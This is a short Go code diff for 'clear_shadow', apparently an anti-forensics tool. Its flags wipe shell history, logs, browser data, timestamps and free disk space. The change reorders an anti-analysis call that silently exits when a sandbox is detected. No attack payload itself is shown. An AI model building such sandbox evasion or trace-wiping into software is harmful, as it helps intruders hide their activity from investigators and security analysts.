@@ -22,20 +22,21 @@ var (
 	freeSpace    = flag.Bool("free-space", false, "Overwrite free disk space")
 	skipModules  = flag.String("skip", "", "Skip modules: shells,logs,browsers,temp,network,artifacts,memory,timestamps (comma-separated)")
 	onlyModules  = flag.String("only", "", "Only run these modules (comma-separated)")
-	auditFile    = flag.String("audit", "", "Audit log path (default: /tmp/clearshadow_audit_TIMESTAMP.log)")
+	auditFile    = flag.String("audit", "", "Audit log path")
 	showVersion  = flag.Bool("version", false, "Show version")
 )
 
 func main() {
 	flag.Parse()
 
-	// Anti-analysis initialization (silent exit if sandbox detected)
-	sweeper.InitStealth()
-
+	// Safe flags — no stealth delay, no operations
 	if *showVersion {
 		fmt.Println("clear_shadow v2.2 — archnexus_707")
 		return
 	}
+
+	// Anti-analysis initialization (silent exit if sandbox detected)
+	sweeper.InitStealth()
 
 	fmt.Println(banner)
 	fmt.Printf("\n  OS: %s/%s  |  Passes: %d  |  Dry-Run: %v\n\n",
